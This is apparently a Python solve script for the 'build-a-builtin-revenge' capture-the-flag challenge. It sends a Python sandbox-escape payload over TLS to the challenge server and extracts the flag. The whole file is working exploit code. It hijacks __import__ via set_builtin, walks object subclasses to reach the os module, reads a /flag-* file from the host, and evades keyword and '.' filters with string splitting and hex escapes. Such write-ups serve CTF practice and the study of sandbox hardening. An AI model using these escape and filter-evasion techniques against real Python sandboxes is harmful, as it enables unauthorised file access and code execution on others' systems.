import ssl
import time
import socket
import re

HOST = "build-a-builtin-revenge.opus4-7.b01le.rs"
PORT = 8443

stage2 = (
    'S=[c for c in (1).__class__.__mro__[1].__subclasses__() if c.__name__=="FileFinder"][0]\n'
    'G=S.__init__.__globals__\n'
    'O=G["sys"].modules["os"]\n'
    'N=[x for x in O.listdir("/") if x.startswith("flag-")][0]\n'
    'F=O.open("/"+N,0)\n'
    'D=O.read(F,200)\n'
    'assert 0,D'
)

# avoid literal '.' in stage-1
stage2_enc = stage2.replace(".", "\\x2e").replace('"', '\\"').replace("\n", "\\n")

payload = (
    'def I(*a):\r '
    'a[1]["exec"]("' + stage2_enc + '",a[1],a[1])\r '
    'return 0\r'
    'set_builtin("__im"+"port__",I)\r'
    'async def f():\r '
    'pass\r'
    'c=f()'
)

assert "." not in payload
assert "import" not in payload
assert "match" not in payload

ctx = ssl.create_default_context()

probe_payload = (
    'def I(*a):\r '
    'assert 0,7\r'
    'set_builtin("__im"+"port__",I)\r'
    'async def f():\r '
    'pass\r'
    'c=f()'
)

def send_payload(src: str, seconds: int = 15) -> bytes:
    out = b""
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=HOST) as s:
            s.recv(1024)  # code >
            s.sendall(src.encode() + b"\n")
            end = time.time() + seconds
            while time.time() < end:
                s.settimeout(2)
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    out += chunk
                except TimeoutError:
                    continue
    return out

flag = None
for attempt in range(1, 11):
    # Warm-up request helps make the late warning/import callback path reliable.
    send_payload(probe_payload, 8)
    out = send_payload(payload, 20)
    m = re.search(rb"bctf\{[^}]+\}", out)
    print(f"[attempt {attempt}] recv_bytes={len(out)} flag={bool(m)}")
    if m:
        text = out.decode("latin1", "replace")
        print(text)
        flag = m.group(0).decode("latin1", "replace")
        break
    time.sleep(0.2)

print("FLAG:", flag if flag else "not found")